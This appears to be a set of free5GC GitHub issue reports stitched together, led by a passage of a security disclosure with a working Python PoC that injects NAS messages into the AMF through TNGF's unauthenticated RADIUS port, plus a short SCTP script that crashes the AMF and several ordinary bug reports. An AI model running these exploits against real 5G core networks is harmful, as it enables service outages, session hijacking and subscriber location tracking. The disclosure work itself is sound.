    Calling-Station-Id = "AA-BB-CC-DD-EE-FF"       ← same session
    EAP-Message = EAP-Response/5G-NAS:
      AN-Parameters: GUAMI + PLMN + EstablishmentCause
      NAS-PDU: Registration Request with SUCI
    [NO Message-Authenticator]

  TNGF internally:
    [INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
    [INFO][TNGF][Radius] Selected AMF Name: AMF
    [INFO][TNGF][NGAP] [TNGF] Send Initial UE Message   ← NAS injected into AMF!

  TNGF → Attacker:
    Access-Challenge + EAP-Request/5G-NAS(AuthenticationRequest)  ← AMF responded with auth vector
```

The attacker has successfully injected a NAS Registration Request into the AMF without possessing the RADIUS shared secret.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF and AMF deployed in Docker.

1. PoC script — complete 2-step attack:

```python
#!/usr/bin/env python3
"""PoC: Inject NAS PDU into 5G core via TNGF RADIUS without shared secret"""
import socket, struct, os, time

TARGET = ('10.100.200.1', 1812)

def send_radius(sock, pkt_id, attrs):
    authenticator = os.urandom(16)
    length = 20 + len(attrs)
    pkt = struct.pack('!BBH', 1, pkt_id, length) + authenticator + attrs
    sock.sendto(pkt, TARGET)
    resp, _ = sock.recvfrom(4096)
    return resp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5)

# --- Step 1: EAP-Response/Identity (no Message-Authenticator) ---
calling = bytes([31, 19]) + b'AA-BB-CC-DD-EE-FF'
called = bytes([30, 27]) + b'11-22-33-44-55-66:TestSSID'
eap_id = struct.pack('!BBH', 2, 0, 14) + bytes([1]) + b'anonymous'
eap_attr = bytes([79, 2 + len(eap_id)]) + eap_id

resp = send_radius(sock, 0x01, calling + called + eap_attr)
eap_resp_id = resp[20 + 2 + 1]  # extract EAP identifier from response
print(f"[+] Step 1: Got Access-Challenge (Code={resp[0]}), EAP ID={eap_resp_id}")

# --- Step 2: EAP-5G NAS with Registration Request ---
guami = bytes([1,6, 0x02,0xf8,0x39, 0x40,0x01,0x00])
plmn = bytes([2,3, 0x02,0xf8,0x39])
est = bytes([4,1, 0x03])
an_params = guami + plmn + est
nas_pdu = bytes([0x7E,0x00,0x41,0x01,0x00,0x07,0x00,
                 0x02,0xf8,0x39,0x00,0x00,0x00,0x00,0x00,0x00,0x01])

vendor_data = bytes([2,0]) + struct.pack('!H', len(an_params)) + an_params + \
              struct.pack('!H', len(nas_pdu)) + nas_pdu
eap_exp = bytes([254, 0x00,0x28,0xAF]) + struct.pack('!I', 3) + vendor_data
eap_5g = struct.pack('!BBH', 2, eap_resp_id, 4+len(eap_exp)) + eap_exp
eap_attr2 = bytes([79, 2+len(eap_5g)]) + eap_5g

resp2 = send_radius(sock, 0x02, calling + called + eap_attr2)
print(f"[+] Step 2: Got response (Code={resp2[0]}), {len(resp2)} bytes")
print(f"[!] NAS PDU injected into AMF — check: docker logs tngf | grep 'Initial UE Message'")
sock.close()
```

2. Run:

```bash
docker restart tngf && sleep 10
python3 poc_radius_inject.py
docker logs tngf 2>&1 | tail -10
```

3. TNGF logs confirm NAS forwarded to AMF:

```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message        ← NAS injected into AMF
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport   ← AMF processed it
```

## Security Impact

1. **NAS PDU Injection**: Attacker can inject arbitrary NAS messages into the AMF, including Registration Requests with crafted SUCI/GUTI/NSSAI. This reaches the same code paths as the NAS TOCTOU crashes (CVE bugs V-01 through V-05), but now triggerable from the **RADIUS network** without any Wi-Fi association or EAP authentication.

2. **AMF Crash via RADIUS**: Combined with the NAS MobileIdentity OOB panics (bug-reports 1-5), an attacker can crash the AMF by injecting a 7-byte NAS Registration Request (`7E 00 41 01 00 01 01`) through TNGF's unauthenticated RADIUS path.

3. **Fake UE Registration**: Attacker can initiate registration procedures for arbitrary SUCIs, causing the AMF to query AUSF/UDM, consuming backend resources.

4. **Session Hijacking**: By using a known UE's `Calling-Station-Id` (MAC address), an attacker can inject messages into an existing UE's RADIUS session.

5. **Amplification**: A single unauthenticated RADIUS packet (83 bytes) causes TNGF to perform NGAP signaling to AMF, which triggers SBI calls to AUSF/UDM — significant amplification from UDP to TCP/HTTP.

6. **Location Tracking**: By probing multiple TNGFs' RADIUS ports with a target UE's MAC address as `Calling-Station-Id`, an attacker can determine which TNGF currently holds a session for that UE. Periodic probing across geographically distributed TNGFs reveals the target's physical movement trajectory — remotely, without physical proximity, and unaffected by MAC randomization (since `Calling-Station-Id` uses the post-association real MAC).

7. **Targeted UE Denial-of-Service**: By hijacking a specific UE's RADIUS session (using its known MAC address), an attacker can corrupt the session state or inject NAS Deregistration Requests through the victim's NGAP context, forcing the target UE off the 5G network.

8. **Core Network State Oracle**: An attacker can inject various NAS message types (Registration Request with 5G-GUTI, Service Request, Deregistration) through a hijacked session and observe AMF's responses via RADIUS. The response differences reveal whether the target UE is registered, has an active PDU session, or holds a valid security context — leaking per-UE core network state to an unauthenticated attacker.

## Expected Behavior

TNGF must enforce Message-Authenticator when EAP-Message is present, per RFC 3579 Section 3.1:

```go
// After attribute parsing loop, before any processing:
if eapMessage != nil && requestMessageAuthenticator == nil {
    radiusLog.Error("Access-Request with EAP-Message but no Message-Authenticator — dropping (RFC 3579)")
    return
}
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File
**Step 1** — Access-Request with EAP-Response/Identity, NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```
TNGF accepted the request and responded with Access-Challenge containing EAP-5G-Start.

**Step 2** — Access-Request with EAP-5G NAS (Registration Request), NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```

TNGF forwarded the NAS PDU to AMF via NGAP `Initial UE Message`. AMF processed it and responded with `Downlink NAS Transport` (containing Authentication Request). The full EAP-5G authentication flow was initiated without any RADIUS authentication.

items.title: [Bugs] Nil Pointer Dereference in AMF NGAP Dispatcher when receive unexpected message sequence
items.body: ## Bug Description The issue occurs because the dispatcher does not enforce the mandatory NGAP message sequence during the initialization of a new RAN connection. Instead of requiring the first message to be an NGSetupRequest, the dispatcher creates an AmfRan context for any incoming message on a new SCTP connection. As a result, if a subsequent message (such as UEContextReleaseComplete) arrives before a valid registration flow is completed, the handler attempts to operate on an uninitialized UE context (ue), leading to a panic. This can be exploited to cause a Denial of Service (DoS) by sending crafted NGAP messages that trigger repeated crashes and restarts of the AMF process, disrupting service for legitimate users. ## To Reproduce Steps to reproduce the behavior: 1. Start the AMF process and ensure it is ready to accept new SCTP connections. 2. Establish a new SCTP connection to the AMF. 3. Send a UEContextReleaseComplete message as the first message on this connection, bypassing the required NGSetupRequest. 4. Observe the AMF logs and process behavior. ## Expected Behavior The AMF should validate the procedural order of incoming NGAP messages. ## Describe the bug
When I press the SHOW INFO button on the REALTIME STATUS screen, it transitions to the login screen 
(AMF information is displayed for a moment and then it transitions to the login screen)

## To Reproduce
0. Attach the UE and put it into CONNECTED state.
1. Display the IMSI in REALTIME STATUS-> and press SHOW INFO.

## Expected behavior
Press SHOW INFO to display AMF information

## Screenshots
0. REALTIME STATUS

![Image](https://github.com/user-attachments/assets/18113420-26c6-46c6-82fb-35f0ef9a03f9)

items.title: [Bugs] AMF crashed when receving invalid NGAP messages
items.body:
## Describe the bug
When testing the free5gc AMF, it always crashes when receiving invalid NGAP messages.

## To Reproduce
Steps to reproduce the behavior:
1. Use https://github.com/free5gc/free5gc-compose as the test target
2. Start it with command `docker compose up`
3. Find the amf address with command `docker inspect free5gc-compose_privnet`
4. Run this POC python script: `python3 free5gc.py amf-address`

```python
import sys, sctp, socket

if len(sys.argv) != 2:
  print("Usage: free5gc.py server-address")
  exit(0)

sk = sctp.sctpsocket_tcp(socket.AF_INET)
sk.connect((sys.argv[1], 38412))

sk.sctp_send(b"Hello!", ppid=socket.htonl(60))

sk.close()
```

## Expected behavior
I think the expected behavior is rejecting the connection request. The current behavior is that the AMF crashes and unable to restart. This could cause DOS attack to the AMF funtionality.

When receiving NGAP message, it should validate the message content and reject malformed messages.

## Screenshots
![图片](https://github.com/free5gc/free5gc/assets/1829883/3c51ecb0-c2ff-4946-8245-7e5e9dffab19)

## Environment (please complete the following information):
 - free5GC Version: v3.3.0
 - OS: Ubuntu 20.04 Server
 - Kernel version: 5.4.0-165-generic

### Configuration File
Use the default config file of free5gc-compose

items.title: [Bugs] AMF fails to decode Registration Request(GUTI) after restart
items.body:
## Describe the bug
If AMF restarts after establishment of 5G NAS security context with ue, AMF fails to decode Registration Request in NAS message container IE of Registration Request(GUTI) and stops Registration Procecure.

## To Reproduce
### Preparation
1. Change AMF config  
 see [Configuration File](#Configuration-File)
2. Change `TestGUTIRegistrationRequest` in `test/registration_test.go` as follows:
   ```go
	// New UE
	//	ue := test.NewRanUeContext("imsi-2089300007487", 1, security.AlgCiphering128NEA0, security.AlgIntegrity128NIA2)
	ue := test.NewRanUeContext("imsi-2089300007487", 1, security.AlgCiphering128NEA2, security.AlgIntegrity128NIA2)
   ```
   After sending ngap UE Context Release Complete, set sleep to restart AMF and connect AMF
   ```go
	// restart AMF (kill and restart AMF process from another window)
	fmt.Println("###")
	time.Sleep(30 * time.Second)

	// close Connection
	// RAN connect to AMF
	// send NGSetupRequest Msg
	// receive NGSetupResponse Msg
   ```
   Change Registration Request in Second Registration (Register with GUTI)  
   according to TS 24.501 v15.06 4.4.6 Protection of initial NAS signalling messages b) 1) 

   ``` go
	innerRegistrationRequest := nasTestpacket.GetRegistrationRequest(nasMessage.RegistrationType5GSInitialRegistration,
		GUTI5GS, nil, ue.GetUESecurityCapability(), ue.Get5GMMCapability(), nil, nil)
	// encrypt inner Registration Request
	m := nas.NewMessage()
	err = m.PlainNasDecode(&innerRegistrationRequest)
	require.Nil(t, err)
	payload, err := m.PlainNasEncode()
	require.Nil(t, err)
	err = security.NASEncrypt(ue.CipheringAlg, ue.KnasEnc, ue.ULCount.Get(), security.Bearer3GPP,
		security.DirectionUplink, payload)
	require.Nil(t, err)
	// add security header to outer Registration Request
	registrationRequest = nasTestpacket.GetRegistrationRequest(nasMessage.RegistrationType5GSInitialRegistration,
		GUTI5GS, nil, ueSecurityCapability, nil, payload, nil)
	// change ue.CipheringAlg to set security header, not to encrypt outer Registration Request
	ue.CipheringAlg = security.AlgCiphering128NEA0
	pdu, err = test.EncodeNasPduWithSecurity(ue, registrationRequest, nas.SecurityHeaderTypeIntegrityProtected, true, false)
	// restore ue.CipheringAlg
	ue.CipheringAlg = security.AlgCiphering128NEA2
	require.Nil(t, err)
	sendMsg, err = test.GetInitialUEMessage(ue.RanUeNgapId, pdu, "")
	require.Nil(t, err)
	_, err = conn.Write(sendMsg)
	require.Nil(t, err)
   ```

### Execution
1. Start NFs as separeted process and start test with "-args noinit" option.

2. Restart AMF after establishment of 5G NAS security context.

3. Send Registration Request with GUTI from UE.

## Expected behavior
Authenticate subscriber before processing the registration request.  
(TS 24.501 v15.06 4.4.4.3 Integrity checking of NAS signalling messages in the AMF)

## Environment (please complete the following information):
 - free5GC Version: v3.0.5
 - OS: Ubuntu 18.04.4 LTS
 - Kernel version: 5.0.0-23-generic
 - go version: 1.14.4

## Trace File
### Configuration File
amfcfg.yaml
```yaml
  security:  # NAS security parameters
    cipheringOrder: # the priority of ciphering algorithms
      - NEA2
```
### PCAP File
[free5gc_fails-to-decode-reg.pcap.gz](https://github.com/free5gc/free5gc/files/6753114/free5gc_fails-to-decode-reg.pcap.gz)

### Log File
```
2021-07-02T02:27:50Z [INFO][AMF][NGAP][127.0.0.1:9487] Handle Initial UE Message
2021-07-02T02:27:50Z [WARN][NAS][Security] Integrity NIA0 is emergency.
2021-07-02T02:27:50Z [WARN][AMF][NAS][AMF_UE_NGAP_ID:1] NAS MAC verification failed(received: 0x6f572c2e, expected: 0x00000000)
2021-07-02T02:27:50Z [INFO][AMF][GMM][AMF_UE_NGAP_ID:1] Handle Registration Request
2021-07-02T02:27:50Z [ERRO][AMF][GMM] NAS decode Fail: MsgType[31] doesn't exist in GMM Message
```

## Pull Request
[Pull Request](https://github.com/free5gc/amf/pull/35) for the fix.

items.body:

<!-- Remove above line after reporting the issue -->

## Describe the bug
In `TestDeregistration` part of the test, the procedure goes as follows:
- send NAS Deregistration Request (UE Originating)
- receive ngap UE Context Release Command
- send ngap UE Context Release Complete

However, after the `send NAS Deregistration Request (UE Originating)`, AMF replies with a `Deregistration accept (UE originating)`. This message is not handled in `TestDeregistration` which leads to errors when trying to register a second UE, without restarting the RAN-AMF connection.

## To Reproduce

- Run by trying to register/deregister 2 UEs, without restarting the RAN-AMF connection.

items.title: [ AMF ] NGAP Error: No RanUe Context[AmfUeNgapID: 1]
items.body:
Hi @all,

I was testing the free5gc deployment by running the Deregestration test multiple times in a row.
I noticed that the second run finishes ok (Test PASS) but with the following error from AMF:

`ERRO[2020-04-23T18:49:02+02:00]/src/amf/amf_ngap/ngap_handler/handler.go:475 free5gc/src/amf/amf_ngap/ngap_handler.HandleUEContextReleaseComplete() No RanUe Context[AmfUeNgapID: 1]              AMF=NGAP`

I run only the test multiple times. The NFs are running only once throughout the entire test.

While going through the code, I noticed that in **func** `HandleInitialContextSetupResponse` and in  **func** `HandleUEContextReleaseComplete`, you use two different functions to obtain the `ranUe` object:

`HandleInitialContextSetupResponse` - `ranUe := ran.RanUeFindByRanUeNgapID(rANUENGAPID.Value)`

`HandleUEContextReleaseComplete` - `ranUe := amf_context.AMF_Self().RanUeFindByAmfUeNgapID(aMFUENGAPID.Value)  ---> This one throws the error.`

I also tried replacing the above call in class `HandleUEContextReleaseComplete` with `ranUe := ran.RanUeFindByRanUeNgapID(rANUENGAPID.Value)`. In that case the error was not occuring.

Why are two different functions used in this case? And why is the Test throwing this error when run for the second time?

Thank you!
